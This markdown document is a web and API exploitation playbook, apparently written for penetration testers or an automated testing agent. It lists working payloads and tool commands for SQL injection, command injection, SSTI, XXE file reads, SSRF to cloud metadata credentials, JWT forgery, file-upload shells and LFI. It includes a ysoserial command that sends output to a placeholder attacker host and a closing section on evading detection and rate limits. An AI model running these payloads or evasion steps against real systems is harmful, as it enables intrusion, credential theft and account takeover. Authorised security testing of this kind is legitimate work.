# Web & API Exploitation

Chain rule: **confirm → exploit → pivot → prove**. Never skip straight to a payload tool without a manual confirmation, because automation sprays and mislabels.

## 0. Preparation

- Know the stack (from `recon.md` fingerprint) — it decides the payload family and the sink type.
- Know the auth model — is there a session cookie? API key? JWT? Basic auth? OAuth? Bearer token in localStorage?
- Save a clean baseline request/response for every endpoint you touch. Baseline = comparison oracle.

## 1. Injection classes

### SQLi

Manual first (3 minutes), automated second.

Manual signals: `'` → error/500/different length; `''` → normal; `1' AND '1'='1` vs `1' AND '1'='2` → boolean differential; `1' ORDER BY 3--` → column count.

```bash
sqlmap -u "https://host/path?id=1" --batch --risk=1 --level=1 \
       --technique=BEUSTQ --dbs --threads=4 -p id
sqlmap -r req.txt --batch --risk=2 --level=3 --technique=BEUSTQ --dbs
ghauri -u "https://host/path?id=1" --dbs
```

- `-p` the confirmed parameter only.
- `--os-shell` / `--file-write` touch the server filesystem → only with explicit operator go.
- Blind/time-based: set `--time-sec=6` and be patient; impatient timeouts produce false negatives.
- Proof: one decoded row, a schema dump of one table, or a `SELECT @@version` result. Save the raw output.

### NoSQLi (Mongo)

JSON body operators: `{"user":{"$ne":""}}`, `{"password":{"$gt":""}}`, `{"$regex":"^a"}`, `{"$where":"sleep(5000)"}`.

```bash
nosqlmap -u "https://host/login" --method POST --data '{"user":"x","password":"x"}' -m 6
```

### Command injection

Prove with a benign marker first: `;id`, `|id`, `$(id)`, `` `id` ``, `%0aid`, newline `%0a`. Then blind (`;sleep 5`), then file read.

```bash
commix -u "https://host/p" --batch --skip-technique=file --skip-technique=os
```

### SSTI

Engine families: Jinja2/Python `{{7*7}}`, Twig `{{7*7}}`, Freemarker `${7*7}`, Velocity, ERB `<%= 7*7 %>`, JSP `${7*7}`, Blade `@php`.

```bash
tplmap -u "https://host/p?name=1" --level 5 --os-shell
```

### XXE

Content-type `text/xml` or `application/xml` with a body → classic XXE. Blind (DTD + out-of-band) when no error.

```bash
xxenum -u "https://host/api" -c "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
```

### SSRF

Test: internal RFC1918, `127.0.0.1`, `0.0.0.0`, `localhost`, IPv6-mapped `::ffff:127.0.0.1`, decimal/hex-encoded IP (`2130706433`, `0x7f000001`), `169.254.169.254` (cloud metadata), `metadata.google.internal`.

```bash
ssrfmap -u "https://host/fetch?url=1"
gopherus --exploit redis 127.0.0.1:6379
```

**SSRF → cloud creds chain** (this is the money path): SSRF to `169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → role name → STS `AssumeRole` with the temporary creds → full cloud control. Prove each hop separately.

### LDAP / XPath / NoSQL variants

LDAP: `*)(uid=*))(|(uid=*` filter injection. XPath: `' or '1'='1`. Both often in login forms with legacy stacks.

## 2. XSS

```bash
dalfox url https://host/search?q=1 --silence --skip-bav
dalfox pipe 'https://host/search?q=1'  # from wordlist
```

Severity depends on **sink**: HTML body = high if session-cookie theft is possible; JS context = critical (same-origin code execution); attribute = medium; unquoted attribute = high.

Proof: a unique marker that renders, plus the reflected payload, plus the sink context. DOM XSS needs JS-source analysis (look for `location.hash`, `document.URL`, `postMessage` sinks) — no server-side scanner finds it.

XSS chain: steal cookie → or use it for CSRF → or call the admin API with the victim's session → full account takeover.

## 3. Auth & session

### JWT

```bash
jwt_tool <token> -T          # test all algs
jwt_tool <token> -C -d wordlist.txt    # crack weak HS256 secret
hashcat -m 16500 token.txt wordlist.txt   # alternate
```

Checks:
- `alg: none` accepted → forge any role.
- `kid` header → inject into SQL (`' UNION SELECT 'secret'--`) or path traversal (`../../dev/null`) to control the key file.
- `jku`/`x5u` → SSRF to attacker JWKS (test against the target's own host to prove SSRF).
- Missing `exp`/`aud`/`iss` → replay.
- HS256/RS256 confusion → sign with the public key as HMAC secret.

### Session

- Fixation: does the session ID change after login? Reuse the pre-login cookie.
- Predictability: entropy of the session ID across logins.
- Missing rotation on privilege change → session fixation to admin.
- Missing `HttpOnly` / `Secure` / `SameSite` → hijack surface.

### Auth bypass (logic, not cryptography)

- Verb tampering: `X-HTTP-Method-Override`, `X-Method-Override`, `?_method=PUT`.
- Path tricks: `/admin` vs `/admin/` vs `/ADMIN` vs `/admin%2f` vs `/./admin` vs `/../admin`.
- JSON vs form confusion: send `Content-Type: application/json` with form-shaped body, or `{"admin": true}` to a form endpoint.
- Case sensitivity, trailing semicolons, null bytes in older stacks.
- Parameter pollution: `role=admin&role=user` — which one wins?
- Unauthenticated API paths that mirror authenticated ones (compare the endpoint list).
- Password reset poisoning: request reset for a victim, swap the `Host` header / `X-Forwarded-Host` → the reset link points at your host.

### MFA

- OTP reused after successful use?
- OTP valid across users/devices?
- Backup codes accepted more than once?
- State machine: skip the MFA step by hitting the post-login endpoint directly?
- Rate limit on OTP attempts?

## 4. Access control

### IDOR / BOLA

The systematic version:

```
for id in 1 2 3 9999:   # or a UUID list from the API
  GET /api/v1/orders/{id} with session A   -> save status+len+first 200 bytes
  GET /api/v1/orders/{id} with session B   -> compare
```

Equal length + different content → confirmed IDOR. Also test **method-level** BOLA (PUT/DELETE/PATCH on objects you can read but should not own) and **field-level** (mass assignment).

### Mass assignment / prototype pollution

```json
{"username":"x","role":"admin"}
{"__proto__":{"role":"admin"}}
{"constructor":{"prototype":{"role":"admin"}}}
```

Look at the response for the newly added field — if `role` comes back, it is writable.

### GraphQL

Introspection on → enumerate every query/mutation, then apply the same authz testing per resolver. Check for mutations that bypass field-level authz, batching abuse, and depth-limit bypass via aliases.

## 5. File handling

### Upload

- Extension: `.phtml .php5 .pht .phar .shtml .asp .aspx .cer .jsp .jspx .war .svg .html .htaccess`
- Content-type vs magic bytes: a PNG with PHP code in EXIF, or `Content-Type: image/png` with `<?php` body.
- Rename: `shell.php.jpg`, `shell.php%00.jpg`, double extensions, trailing dot/space, unicode homoglyphs.
- Storage path: is the uploaded file served back? Executable? `Content-Disposition`?

```bash
exiftool -all= shell.php.jpg          # strip/inspect metadata
ffuf -u https://host/upload/FUZZ -w exthosts.txt
```

### Path traversal / LFI

`../`, `....//`, `%2e%2e%2f`, `..%252f`, absolute paths, `/proc/self/environ`, null byte (old PHP), `php://filter/convert.base64-encode/resource=index.php` (source disclosure), `file://`.

```bash
lfimap -u "https://host/index.php?page=1"
```

### Deserialization

Java: `ysoserial` (test with a DNS/HTTP callback gadget first, never a destructive one by default). .NET: `ysoserial.net`/`marshalsec`. PHP: `phpggc`. Python: `pickle` — verify the endpoint deserialises untrusted input before building anything.

```bash
ysoserial-all.jar CommonsCollections6 'curl http://{attacker}/$(whoami)'
```

### XXE + SSRF + LFI are all "file://" cousins — test them together.

## 6. Infrastructure-facing web bugs

- **Subdomain takeover**: dangling CNAME → provider claim page. Proof = the provider's own claim endpoint returning the target's domain.
- **CORS**: `Access-Control-Allow-Origin: <target>` + `Access-Control-Allow-Credentials: true` → cross-origin credentialed read. Prove with an `Origin:` header from a foreign origin.
- **Open redirect**: `?redirect=https://evil` — used for OAuth token theft and phishing credibility.
- **Host header injection**: `Host: evil.tld` → password-reset link poisoning, cache poisoning, absolute-URL poisoning.
- **Cache poisoning**: check `X-Cache`, `Age`, `Vary` headers; unkeyed headers in the cache key.
- **SSRF via webhook/import/preview features** — the most common real-world high-severity web bug. Test URL parameters, PDF renderers, image processors, link-preview bots, XML/JSON importers.

## 7. Business logic (highest severity, no scanner finds these)

- Price/quantity manipulation (negative values, currency rounding, coupon stacking).
- Race conditions: double-spend, double-apply — concurrent requests with `curl --parallel` or a small script.
- Step skipping: skip verification/2FA/payment steps by calling the final endpoint directly.
- One-time-use token reuse.
- Account takeover via email/phone change without re-verification.
- Invite/role workflows where the inviter grants more than intended.
- Refund/credit abuse.

## 8. Verification recipes (copy into findings)

```
SQLi     : POST /login ... ' OR 1=1--  -> 200 + admin dashboard body, vs 302 for normal user
IDOR     : GET /api/v1/invoice/1042 with user B -> 200 + invoice belonging to user A
SSRF     : GET /fetch?url=http://169.254.169.254/latest/meta-data/ -> 200 + role name
RCE      : POST /run  cmd=id  ->  uid=1000(web) gid=1000(web) ...
LFI      : GET /?file=....//....//etc/passwd -> root:x:0:0:...
JWT none : POST /api/admin with alg=none token -> 200 + admin data
```

Every finding stores: the exact request, the exact response (relevant part), the tool output file path, and the re-run command.

## 9. Anti-detection & pacing

- One host at a time; add jitter between requests.
- Prefer the app's own endpoints over noisy scanners once you know the shape.
- If the app has rate limiting, trigger it deliberately once to learn the threshold, then stay under it — and report the limit as a finding.
- Use the browser-like headers (UA, Accept-Language, sec-ch-ua) when the app fingerprints clients.
- Cache and reuse responses; do not re-fetch what you already have.
